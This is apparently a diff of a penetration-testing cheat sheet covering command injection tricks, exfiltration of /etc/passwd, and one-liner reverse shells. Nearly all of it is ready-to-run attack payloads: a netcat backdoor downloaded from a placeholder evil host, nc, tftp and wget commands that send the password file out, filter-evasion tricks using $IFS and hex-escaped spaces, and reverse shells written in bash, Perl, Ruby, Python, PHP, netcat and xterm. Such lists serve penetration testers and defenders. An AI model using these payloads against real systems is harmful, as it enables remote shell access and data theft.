@@ -9,84 +9,88 @@ usage
 
 **Executing Commands**
 
-Seperating Commands 
+Seperating Commands<br>
 ``` blah;blah2 ```
 
-PIPES
+PIPES<br>
 ``` blah ^ blah 2```
 
-AND 
+AND <br>
 ```blah && blah2```
 
-OR
+OR<br>
 ```FAIL || X```
 
-OR 
+OR <br>
 ``` blah%0Dblah2%0Dblah3 ```
 
-Backtick
+Backtick<br>
 ``` `blah` ```
 
-Background 
+Background <br>
 ``` `blah & blah2` ```
 
 ***Shell commands without spaces***
-Using Internal Field Separator (IFS)
-
+<b>Using Internal Field Separator (IFS)</b>
 Test for cmd injection withouot spaces:<br>
-```sleep${IFS:0:1}20```
+``` sleep${IFS:0:1}20 ```<br>
 
-Example netcat backdoor without spaces:
-```{wget,http://evilhost.com/nc}```
-```{chmod,+x,./nc}```
-```{./nc,-l,-p,6666,-e,/bin/bash```
+Example netcat backdoor without spaces:<br>
+``` {wget,http://evilhost.com/nc} ```<br>
+``` {chmod,+x,./nc} ```<br>
+``` {./nc,-l,-p,6666,-e,/bin/bash} ```<br>
 
-See: https://jon.oberheide.org/blog/2008/09/04/bash-brace-expansion-cleverness/<br>
+<b>Shell Variables</b>
+``` CMD=$'cat\x20/etc/passwd';$CMD ```
+
+<br>shell variable increment through file one line at a time</b>
+increment the first +1 to retreive the entire file, line by line<br>
+``` SP=$'\x20';cat$SP/etc/passwd|tail$SP-n+1|head$SP-n+1 ```
 
 
 **Exfiltrating Files / Data**
 
-FTP 
+FTP <br>
 Make a new text file, and echo and then redirect to FTP
 
-NC 
+NC <br>
 ``` 'nc -e /bin/sh' ```
 
-NC 
+NC <br>
 ``` 'echo /etc/passwd  | nc host port' ```
 
-TFTP 
+TFTP <br>
 ``` 'echo put /etc/passwd | tftp host' ```
 
-WGET: 
+WGET: <br>
 ``` 'wget --post-file /etc/passwd' ```
 
 **One-Liner Reverse Shells**
 
-On the listener 
+On the listener <br>
 ``` $ nc -l -p 8080 -vvv' ```
 
 On the remote host...
-Bash:
+Bash:<br>
 ``` $ bash -i >& /dev/tcp/10.0.0.1/8080 0>&1 ```
 
-``` $ exec 5<>/dev/tcp/evil.com/8080 ```
+``` $ exec 5<>/dev/tcp/evil.com/8080 ```<br>
 '$ cat <&5 | while read line; do $line 2>&5 >&5; done'
 
-Perl
+Perl<br>
 ```$ perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' ```
 
-Ruby
+Ruby<br>
 ``` $ ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)' ```
 
-Python
+Python<br>
 ``` $ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' ```
 
-PHP
+PHP<br>
 ``` $ php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");' ```
 (Assumes TCP uses file descriptor 3. It it doesn't work, try 4,5, or 6)
 
-Netcat
+Netcat<br>
 ``` $ nc -e /bin/sh 10.0.0.1 1234 ```
 
 ``` $ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f ```
@@ -95,11 +99,9 @@ Netcat
 XTERM:<br>
 Server: <br>
 ```$ xterm -display 10.0.0.1:1```
-Listener:
+Listener:<br>
 ```$ Xnest :1```
 ```$ xhost +targetip```
 
 
-
-
-More docs: /docs/attack-docs/remote-cmd-exfiltration/
+<br>More docs: /docs/attack-docs/remote-cmd-exfiltration/<br>
